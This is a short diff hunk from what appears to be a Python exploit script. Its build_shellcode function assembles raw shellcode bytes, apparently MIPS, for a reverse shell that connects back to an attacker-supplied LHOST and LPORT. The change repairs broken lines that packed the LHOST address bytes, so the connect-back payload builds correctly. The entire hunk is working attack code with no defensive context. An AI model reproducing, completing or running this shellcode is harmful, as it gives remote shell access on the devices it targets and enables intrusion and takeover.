@@ -109,8 +109,8 @@ def build_shellcode(LHOST, LPORT):
     shell_code += b'\xfc\x8f\xa4\xff\xfc\x24\x0f\xff\xfd\x01\xe0\x78\x27'
     shell_code += b'\xaf\xaf\xff\xe0\x3c\x0e' + struct.pack('>H', int(LPORT))	# LPORT
     shell_code += b'\xaf\xae\xff\xe4'
-    shell_code += b'\x3c\x0e' + struct.pack('>H', socket.inet_aton(LHOST)[0:2]	# LHOST low part
-    shell_code += b'\x35\xce' + struct.pack('>H', socket.inet_aton(LHOST)[2:4]	# LHOST high part
+    shell_code += b'\x3c\x0e' + socket.inet_aton(LHOST)[0:2]	# LHOST low part
+    shell_code += b'\x35\xce' + socket.inet_aton(LHOST)[2:4]	# LHOST high part
     shell_code += b'\xaf\xae\xff\xe6\x27\xa5'
     shell_code += b'\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10'
     shell_code += b'\x4a\x01\x01\x01\x0c\x00\x07\x80\x2a\x16\x00\x00\x25'
